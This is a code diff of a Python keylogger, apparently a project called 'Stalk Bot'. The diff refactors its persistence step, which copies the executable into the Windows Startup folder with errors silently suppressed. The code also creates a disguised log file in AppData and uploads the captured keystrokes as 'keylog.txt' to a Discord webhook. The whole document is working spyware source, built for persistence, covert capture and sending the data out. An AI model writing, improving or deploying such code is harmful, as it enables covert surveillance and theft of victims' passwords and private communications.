@@ -5,19 +5,28 @@ from pynput.keyboard import Listener
 import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 
-script_path = sys.executable
-filename = os.path.basename(script_path)
-destination_folder = os.environ['USERPROFILE'] + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
-destination_path = os.path.join(destination_folder, filename)
-logpath = os.environ['USERPROFILE'] + "/AppData/Roaming/Microsoft/tempfile.txt"
 webhook = DiscordWebhook(url="WebHook_URL", username = "Stalk Bot", avatar_url = "https://avatars.githubusercontent.com/u/91149112")
 
-if not os.path.exists(destination_path):
-    shutil.copy2(script_path, destination_path)
+try:
+    startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
+    exe_path = sys.argv[0]
+    exe_name = os.path.basename(exe_path)
+    destination = os.path.join(startup_folder, exe_name)
 
-if not os.path.exists(logpath):
-    with open(logpath, "w") as file1:
-      file1.write("First time file")
+    if not os.path.exists(destination):
+        shutil.copyfile(exe_path, destination)
+except:
+    pass
+
+try:
+    logpath = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\tempfile.txt")
+    if not os.path.exists(logpath):
+        with open(logpath, "w") as file:
+            file.write("First time file")
+except:
+    pass
+
+
 
 with open(logpath, "r") as file:
     webhook.add_file(file=file.read(), filename="keylog.txt")
